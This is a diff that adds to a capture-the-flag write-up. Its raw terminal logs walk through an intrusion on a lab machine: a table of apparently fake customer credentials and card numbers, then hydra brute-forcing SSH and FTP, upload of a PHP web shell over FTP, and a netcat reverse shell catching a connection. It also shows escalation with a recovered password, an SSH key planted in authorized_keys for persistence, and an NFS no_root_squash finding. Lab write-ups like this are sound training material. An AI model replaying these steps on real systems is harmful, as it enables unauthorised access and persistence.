@@ -107,9 +107,142 @@ gpg:       secret keys read: 1
 gpg:  secret keys unchanged: 1
 ```
 
-|Customer Name|	Username|	Password|	Credit card number|	CVC|
-____________________________________________________________
-|Par. A. Doxx	|paradox	|ShibesAreGreat123|	4111 1111 4555 1142|	432|
-____________________________________________________________
-0day Montgomery	0day	OllieIsTheBestDog	5555 3412 4444 1115	642
-Muir Land	muirlandoracle	A11D0gsAreAw3s0me	5103 2219 1119 9245	737
+| Customer Name  |  Username    |     Password     |  Credit card number |CCV|
+|----------------|--------------|------------------|---------------------|---|
+| Par. A. Doxx   |   paradox    |ShibesAreGreat123 | 4111 1111 4555 1142 |432|
+| 0day Montgomery|    0day      |OllieIsTheBestDog | 5555 3412 4444 1115 |642|
+| Muir Land      |muirlandoracle|A11D0gsAreAw3s0me | 5103 2219 1119 9245 |737|
+
+```
+hydra -L user -P pass ssh://10.10.211.114
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 18:26:54
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
+[DATA] attacking ssh://10.10.211.114:22/
+[ERROR] target ssh://10.10.211.114:22/ does not support password authentication (method reply 36).
+```
+```
+hydra -L user -P pass ftp://10.10.211.114
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 18:26:00
+[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
+[DATA] attacking ftp://10.10.211.114:21/
+[21][ftp] host: 10.10.211.114   login: paradox   password: ShibesAreGreat123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-09 18:26:04
+```
+```
+ftp 10.10.62.143                   
+Connected to 10.10.62.143.
+220 (vsFTPd 3.0.3)
+Name (10.10.62.143:reggie): paradox
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd backups
+250 Directory successfully changed.
+ftp> put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+553 Could not create file.
+ftp> cd ..
+250 Directory successfully changed.
+ftp> put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5495 bytes sent in 0.00 secs (39.7003 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 48       48             24 Nov 08 21:25 backups
+-rw-r--r--    1 0        0           65591 Nov 17 20:42 hallway.jpg
+-rw-r--r--    1 0        0            1770 Nov 17 20:42 index.html
+-rw-r--r--    1 0        0             576 Nov 17 20:42 main.css
+-rw-r--r--    1 0        0            2511 Nov 17 20:42 overpass.svg
+-rw-r--r--    1 1001     1001         5495 Apr 10 00:27 shell.php
+```
+
+```
+nc -lvnp 9001                                                                                                                                                                              1 ⨯
+listening on [any] 9001 ...
+connect to [10.9.239.22] from (UNKNOWN) [10.10.62.143] 55848
+Linux ip-10-10-62-143 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 01:42:51 up 18 min,  0 users,  load average: 0.00, 0.01, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: cannot set terminal process group (885): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh-4.4$ whoami
+whoami
+apache
+sh-4.4$ cat /etc/passwd | grep -i bash
+cat /etc/passwd | grep -i bash
+root:x:0:0:root:/root:/bin/bash
+james:x:1000:1000:James:/home/james:/bin/bash
+paradox:x:1001:1001::/home/paradox:/bin/bash
+sh-4.4$ su paradox
+su paradox
+Password: ShibesAreGreat123
+whoami
+paradox
+```
+
+```
+ssh-keygen -f paradox              
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in paradox
+Your public key has been saved in paradox.pub
+The key fingerprint is:
+SHA256:KXGQq5N73XfOcgXw2P/Ss05Re0keSPSqklltU521swg reggie@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|      ..    .o  .|
+|      ..    o o =|
+|      ...  E * Oo|
+|      .o .  + X B|
+|     o. S  . * O.|
+|    +  .  + o . =|
+|     o . = .   +.|
+|    . . . o o.=.o|
+|     .     . =++o|
++----[SHA256]-----+
+
+cat paradox.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ34iovToFijivw0W/q+yGp+l4WRJdlA4QG7lgQN/dZBn9VEzGFxgvffABastsKnU+KsMWdW4yzHODkvuAYBkcN7W0iP2NU0Kwx6T2aENN7Uvs/IsbtSPKZHFdwZelh2D3pXGeXgnO3MTOG4RaJWP3bb7gKmrAQpIRS5KF0oZWWAbhYdNsvScLAJieOSlNQreKhId2mLpKftxUX8Hk2bNVeglyPP5NvVlVZ6G3qxNmP7w9aptBHVRqX1VkDcspuGrYVYeFhtWGbgzbgXzPumWG2dmbB9JjS/lgUrg3gJsq6JbSvpmyT09EXEaqbMcDJZhbQGXzVB+EdCHokNciWZvuZZoD1U3RjQX3tjC+X5nfdStC+dwkuLayrab17riplFXGXd/hkBSly+3YlzvvMsm5UbQDgo70dlO/NJ6gauHGOpZBoUlNQzF/9ZIt+QdTRYpSB------------------------------rOMoZuLNmDLLwsXIC12XAc= ------@kali
+
+*Attack machine /home/paradox/.ssh/authorized_keys*
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ34iovToFijivw0W/q+yGp+l4WRJdlA4QG7lgQN/dZBn9VEzGFxgvffABastsKnU+KsMWdW4yzHODkvuAYBkcN7W0iP2NU0Kwx6T2aENN7Uvs/IsbtSPKZHFdwZelh2D3pXGeXgnO3MTOG4RaJWP3bb7gKmrAQpIRS5KF0oZWWAbhYdNsvScLAJieOSlNQreKhId2mLpKftxUX8Hk2bNVeglyPP5NvVlVZ6G3qxNmP7w9aptBHVRqX1VkDcspuGrYVYeFhtWGbgzbgXzPumWG2dmbB9JjS/lgUrg3gJsq6JbSvpmyT09EXEaqbMcDJZhbQGXzVB+EdCHokNciWZvuZZoD1U3RjQX3tjC+X5nfdStC+dwkuLayrab17riplFXGXd/hkBSly+3YlzvvMsm5UbQDgo70dlO/NJ6gauHGOpZBoUlNQzF/9ZIt+QdTRYpSB------------------------------rOMoZuLNmDLLwsXIC12XAc= ------@kali" > authorized_keys
+```                          
+
+```
+ssh -i paradox paradox@10.10.62.143    
+The authenticity of host '10.10.62.143 (10.10.62.143)' can't be established.
+ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.62.143' (ECDSA) to the list of known hosts.
+Last login: Sat Apr 10 01:59:56 2021
+```
+
+
+```
+Using Linpeas.sh
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+```
